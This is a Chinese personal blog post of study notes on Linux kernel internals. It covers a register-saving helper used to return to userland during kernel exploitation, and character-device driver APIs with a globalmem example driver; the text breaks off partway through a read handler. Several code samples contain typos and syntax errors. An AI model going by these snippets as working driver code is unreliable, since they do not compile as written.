
<!DOCTYPE html>
<html lang="en | zh-CN |zh-TW">
<head>
    <meta charset="utf-8" />
    <title>kernel | Q^Q</title>
    <meta name="author" content="desk9t" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>









<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.1.1"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>Q^Q</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;Q^Q</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div class="article">
    <div>
        <h1>kernel</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/3/25
        </span>
        
        
    </div>
    
    <div class="content" v-pre>
        <h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>对于kernel，需要知道的</p>
<p>kernel起始也只是程序，只不过权限高一点而已，设计到一些的区别也不过权限区别</p>
<p>kernel运行在虚拟内存的内核区，而普通的用户程序运行在用户区，两各区域是相互隔开的，一般相互不交叉</p>
<h3 id="寄存器与指令"><a href="#寄存器与指令" class="headerlink" title="寄存器与指令"></a>寄存器与指令</h3><p><code>GS</code>寄存器</p>
<p>是程序在内核态与用户态之间转换时需要用到的寄存器，储存的是即将转换的地址(内核栈栈顶地址或者用户栈栈顶地址)</p>
<p>swapgs指令</p>
<p>就是汇编指令中用于切换的指令。</p>
<p>iret(interrupt return)也是汇编指令，它与int 0x80(interrupt)对应。</p>
<p>可以写一个简单的C函数保存信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// intel flavor assembly</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// at&amp;t flavor assembly</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">    <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">    :<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_eflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line">    :</span><br><span class="line">    : <span class="string">&quot;memory&quot;</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里说一下，<code>pushf</code>里的<code>f</code>代表的<code>flag</code>,标志位寄存器。所以pushf作用是将标志位寄存器压入栈中。</p>
<p>关于为什么我们要回到用户空间？</p>
<ul>
<li>Most useful things we want to do are much easier from userland.</li>
<li>In KernelSpace, there’s no easy way to:<ul>
<li>Modify the filesystem</li>
<li>Create a new process</li>
<li>Create network connections</li>
</ul>
</li>
</ul>
<h3 id="字符设备"><a href="#字符设备" class="headerlink" title="字符设备"></a>字符设备</h3><p>字符设备典型的就是terminal</p>
<p>与之相对应的还有</p>
<ul>
<li>块设备(硬盘)</li>
<li>网络设备(网卡)</li>
</ul>
<h3 id="驱动相关函数和结构体"><a href="#驱动相关函数和结构体" class="headerlink" title="驱动相关函数和结构体"></a>驱动相关函数和结构体</h3><p>linux字符设备驱动结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cdev结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>          <span class="comment">//内嵌的kobject对象</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>		  <span class="comment">//所属模块</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span>  <span class="comment">//文件操作结构体</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="type">dev_t</span> dev;					  <span class="comment">//设备号</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> count</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>cdev结构体的dev_t定义了设备号，32位(12位为主设备号，20位为次设备号)</p>
<p>使用宏获得主次设备号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MAJOR(<span class="type">dev_t</span> dev)</span><br><span class="line">MINOR(<span class="type">dev_t</span> dev)</span><br></pre></td></tr></table></figure>

<p>cdev结构体的<u>file_operation</u>指针定义字符设备驱动提供给悉尼文件系统的<u>接口</u>函数</p>
<p>linux内核提供了一组函数用以操作cdev结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="keyword">struct</span> file_oprations *)</span>;<span class="comment">//用于初始化cdev的成员，并建立cdev和file_operation之间的连接</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> cdev *<span class="title function_">cdev_alloc</span><span class="params">(<span class="type">void</span>)</span>;	<span class="comment">//动态申请一个cdev内存</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cdev_put</span><span class="params">(<span class="keyword">struct</span> cdev *p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="type">dev_t</span> <span class="type">unsigned</span>)</span>;	<span class="comment">//将设备添加到系统，使用分配好的设备号和已初始化的设备结构</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cdev_del</span><span class="params">(<span class="keyword">struct</span> cdev *)</span>;	<span class="comment">//和cdev_add()对应</span></span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *cdev, <span class="keyword">struct</span> file_operation *fops)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(cdev，<span class="number">0</span>，<span class="keyword">sizeof</span> *cdev);</span><br><span class="line">	INIT_LIST_HEAD(&amp;cdev-&gt;<span class="built_in">list</span>);</span><br><span class="line">	kobject_init(&amp;cdev-&gt;kobj, &amp;ktype_cdev_default);</span><br><span class="line">	cdev-&gt;ops = fops;<span class="comment">//将传入的文件操作结构的指针赋值给cdev的ops</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>cdev_alloc()</code>函数用于动态申请一个cdev内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cdev *<span class="title function_">cdev_alloc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> *<span class="title">p</span> =</span> kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> cdev), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span>(p)&#123;</span><br><span class="line">		INIT_LIST(&amp;p-&gt;<span class="built_in">list</span>);</span><br><span class="line">		kobject_init(&amp;p-&gt;kobj,&amp;ktype_cdev_dynamic);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>cdev_add()</code>函数  (<em>驱动模块的加载函数中</em>)  和cdev_del()函数（驱动模块的写在函数中）分别向系统添加和删除一个cdev，完成字符设备的注册和销毁。</p>
<p>在cdev_add()函数向系统注册设备之前，应首先调用以下函数向系统申请设备号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc_chrdev_region(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)	<span class="comment">//分配一个可用设备号</span></span><br><span class="line">register_chrdev_region(<span class="type">dev_t</span> from, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)	<span class="comment">//注册这个设备号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//register_chrdev_region`函数用于已知设备的设备号的情况</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而<code>alloc_chrdev_region</code>用于设备号未知向系统动态申请被占用的设备号的情况，函数调用成功后，会把得到的设备号放入第一个参数dev中。<code>alloc_chrdev_region()</code>相比于<code>register_chrdev_region()</code>的优点在于它会自动避开设备号重复的冲突。</p>
<p>相应的，在调用<code>cdev_del()</code>函数从系统注销字符设备之后，<code>unregister_chrdev_region()</code>应该被调用以释放原先申请的设备号。</p>
<p>函数原型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void unregister_chrdev_region(dev_t from ,unsigned count)</span><br></pre></td></tr></table></figure>



<h4 id="file-operation结构体"><a href="#file-operation结构体" class="headerlink" title="file_operation结构体"></a>file_operation结构体</h4><p>file_operation结构体的成员函数是字符驱动设备程序设计的主体内容(API)，这些内容实际在应用程序进行Linux的open(),write(),read(),close()等系统调用时最终被内核调用。file_operation结构体目前已经比较庞大.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">struct file_operation&#123;</span><br><span class="line">	struct module *owner;</span><br><span class="line">	loff_t (*llseek) (struct file *,loff_t,int);</span><br><span class="line">	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);</span><br><span class="line">	ssize_t (*write) (struct file *,const char __user *,size_t, loff_t);</span><br><span class="line">	ssize_t (*aio_read) (struct kiocb *, const struct iovec *,unsigned long, loff_t);</span><br><span class="line">	ssize_t (*aio_write) (struct kiocb *, const struct iovec *,unsigned long,loff_t);</span><br><span class="line">	int (*iterate) (struct file *, struct dir_context *);</span><br><span class="line">	unsigned int (*poll) (struct file *,struct poll_table_struct *);</span><br><span class="line">	long (*unlocked_iooctl) (struct file *,unsigned int, unsigned long);</span><br><span class="line">	long (*compat_ioctl) (struct file *,unsigned int, unsigned long);</span><br><span class="line">	int (*mmap) (struct file *，struct vm_area_struct *);</span><br><span class="line">	int (*open) (struct inode *,struct file *);</span><br><span class="line">	int (*flush) (struct file *,fl_ower_t id);</span><br><span class="line">	int (*release) (struct file *,loff_t, loff_t, int datasync);</span><br><span class="line">	int (*aio_fsync) (struct kiocb *,int dataysnc);</span><br><span class="line">	int (*fasync) (int,struct file *,int);</span><br><span class="line">	int (*lock) (struct file *, int,struct file_lock *);</span><br><span class="line">	ssize_t (*sendpage) (struct file *，struct page *,int, size_t, loff *,int);</span><br><span class="line">	unsigned long (*get_unmapped_aread) (struct file *, unsigned long, unsigned long,unsigned 						long,unsigned long);</span><br><span class="line">	int (*check_flags) (int);</span><br><span class="line">	int (*flock) (struct file *,struct file_lock *);</span><br><span class="line">	ssize_t (*spllice_write) (struct pipe_inode_info *,struct file *,loff_t *,size_t, unsigned int);</span><br><span class="line">	ssize_t (*splice_read) (struct file *，loff_t *,struct pipe_inode_info *,size_t,unsigned int);</span><br><span class="line">	int (*setlease) (struct file *file,int mode, loff_t offset, loff_t len);</span><br><span class="line">	int (*show_fdinfo) (struct seq_file *m, struct file *f);</span><br><span class="line">	</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>………..</p>
<p>API函数的详细解释</p>
<p>………</p>
<p>file_operation结构体中的成员函数是字符设备驱动与内核虚拟文件系统的接口，是用户空间对Linux进行系统调用的最终的落实者。大多数字符设备会实现read(),write(),ioctl()函数</p>
<h4 id="字符设备驱动IO控制函数模板"><a href="#字符设备驱动IO控制函数模板" class="headerlink" title="字符设备驱动IO控制函数模板"></a>字符设备驱动IO控制函数模板</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//读设备</span><br><span class="line">ssize_t xxx_read(struct file *filp，char __user *buf,size_t count,loff_t *f_ops)</span><br><span class="line">&#123;					//文件结构体指针，用户空间内存的地址，要读的字节数，相对文件开头的偏移</span><br><span class="line">	...</span><br><span class="line">	copy_to_user(buf,...,...);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">//写设备</span><br><span class="line">ssize_t xxx_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_ops)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	copy_from_user(...,buf,...);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">//ioctl函数</span><br><span class="line">long xxx_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	switch(cmd)&#123;</span><br><span class="line">	case XXX_CMD1:</span><br><span class="line">		...</span><br><span class="line">	case XXX_CMD2：</span><br><span class="line">		...</span><br><span class="line">	default:</span><br><span class="line">	//不能支持的命令</span><br><span class="line">		return	- ENOTTY;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用户空间是不能直接访问内核空间的，所以当需要数据交换时就会用到<code>copy_to_user()</code>,<code>copy_from_user()</code>其就相当于<em>门</em></p>
<p>函数原型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsigned long copy_from_user(void *to ,const void __user *from, unsigned long count);</span><br><span class="line">unsigned long copy_to_user(void __user *to ,const void  *from, unsigned long count);</span><br><span class="line">//__user 是一个宏，表明代码指向用户空间</span><br></pre></td></tr></table></figure>

<p>拓展一下，如果只是简单数据类型如<code>char</code>,<code>int</code>,<code>long</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get_user(val, (int *) arg);//用户——&gt;内核</span><br><span class="line">put_user(val, (int *) arg);//内核——&gt;用户</span><br><span class="line">//copy_to_user(), put_user()自包含access_ok(),是对地址合法性的检查。</span><br><span class="line">//__put_user(),__copy_to_user()没有</span><br></pre></td></tr></table></figure>







<h3 id="globalmem虚拟设备"><a href="#globalmem虚拟设备" class="headerlink" title="globalmem虚拟设备"></a>globalmem虚拟设备</h3><h4 id="globalmem虚拟设备实列描述"><a href="#globalmem虚拟设备实列描述" class="headerlink" title="globalmem虚拟设备实列描述"></a>globalmem虚拟设备实列描述</h4><p><code>globalmem</code>是一个虚拟字符驱动设备，意味着“全局内存”，分配一片大小为GLOBALMEM_SIZE(4KB)的内存空间，并在驱动中提供针对这片内存的读写，控制和定位函数，以供用户空间进程获取和设置这片内存的内容。没有实际价值</p>
<h4 id="globalmem设备结构体和宏"><a href="#globalmem设备结构体和宏" class="headerlink" title="globalmem设备结构体和宏"></a>globalmem设备结构体和宏</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;linux/module.h&gt;</span><br><span class="line">#include&lt;linux/fs.h&gt;</span><br><span class="line">#include&lt;linuc/init.h&gt;</span><br><span class="line">#include&lt;linux/cdev.h&gt;</span><br><span class="line">#include&lt;linux/uaccess.h&gt;</span><br><span class="line"></span><br><span class="line">#define GLOBALMEM_SIZE 0x1000</span><br><span class="line">#define MEM_CLEAR 0x1</span><br><span class="line">#define GLOBALMEM_MAJOR 230</span><br><span class="line"></span><br><span class="line">static int globalmem_major = GLOBALMEM_MAJOR</span><br><span class="line">module_param(globalmem_major,int,S_IRUGO);</span><br><span class="line"></span><br><span class="line">struct globalmem_dev&#123;</span><br><span class="line">	struct cdev cdev;</span><br><span class="line">	unsigned char mem[GLOBALMEM_SIZE];//定义了cdev结构体，并将其使用的内存空间一起打包</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct globalmem_dev *globalmem_devp;</span><br></pre></td></tr></table></figure>

<h4 id="加载和卸载设备驱动"><a href="#加载和卸载设备驱动" class="headerlink" title="加载和卸载设备驱动"></a>加载和卸载设备驱动</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">static void globalmem_setup_cdev(struct globalmem_dev *dev,int index)</span><br><span class="line">&#123;</span><br><span class="line">	int err, decno = MKDEV(globalmem_major,index);</span><br><span class="line">	</span><br><span class="line">	cdev_init(&amp;dev-&gt;cdev, &amp;globalmem_fops);</span><br><span class="line">	dev-&gt;cdev.owner = THISMODULE;</span><br><span class="line">	err = cdev_add(&amp;dev-&gt;cdev, devno, 1);</span><br><span class="line">	if(err)</span><br><span class="line">		printk(KERN_NOTICE &quot;Error %d adding globalmem&quot;.err .index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static int __init globalmem_init(void)</span><br><span class="line">&#123;</span><br><span class="line">	int ret;</span><br><span class="line">	dev_t devno = MKDEV(globalmem_major, 0);</span><br><span class="line">	</span><br><span class="line">	if(globalmem_major)</span><br><span class="line">		ret = register_chrdev_region(devno, 1, &quot;globalmem&quot;);</span><br><span class="line">	else&#123;</span><br><span class="line">		ret = alloc_chrdev_region(&amp;devno,o,1,&quot;globalmem&quot;);</span><br><span class="line">		globalmem_major = MAJOR(devno);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	if(ret &lt; 0);</span><br><span class="line">		return ret;</span><br><span class="line">	</span><br><span class="line">	globalmem_devp = kzalloc(sizeof(struct globalmem_dev), GFP_KERNEL);</span><br><span class="line">	if(!globalmem_devp)&#123;</span><br><span class="line">		ret = -ENOMEM;</span><br><span class="line">		goto fail_malloc;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	globalmem_setup_cdev(globalmem_devp,0);</span><br><span class="line">	return 0;</span><br><span class="line">	fail_malloc:</span><br><span class="line">	unregister_chrdev_region(devno, 1);</span><br><span class="line">	return ret;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">module_init(globalm,em_init);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="globalmem设备驱动的文件操作结构体"><a href="#globalmem设备驱动的文件操作结构体" class="headerlink" title="globalmem设备驱动的文件操作结构体"></a>globalmem设备驱动的文件操作结构体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static const struct file_operations globalmem_fops = &#123;</span><br><span class="line">	.owner           = THIS_MODULE;</span><br><span class="line">	.llseek          = globalmem_llseek,</span><br><span class="line">	.read            = globalmem_read,</span><br><span class="line">	.write           = globalmem_write,</span><br><span class="line">    .unlocked_ioctl  = globalmem_ioctl,</span><br><span class="line">    .open            = globalmem_open,</span><br><span class="line">    .release         = gloabalmem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="globalmemq设备驱动的读函数"><a href="#globalmemq设备驱动的读函数" class="headerlink" title="globalmemq设备驱动的读函数"></a>globalmemq设备驱动的读函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">static ssize_t globalmem_read(struct file filp, char __suer * buf,size_t size, loff_t *ppos)</span><br><span class="line">&#123;</span><br><span class="line">	unsigned long p = *ppos;</span><br><span class="line">	unsigned int count = size;</span><br><span class="line">	int ret = 0;</span><br><span class="line">	struct globalmem_dev *dev = filp-&gt;private_data;</span><br><span class="line">	</span><br><span class="line">	if(p &gt;= GLOBALMEM_SIZE)</span><br><span class="line">		return 0;</span><br><span class="line">	if(count &gt; GLOBANMEM_SIZE - p)</span><br><span class="line">		count = GLOBALMEM_SIZE - p;</span><br><span class="line">		</span><br><span class="line">	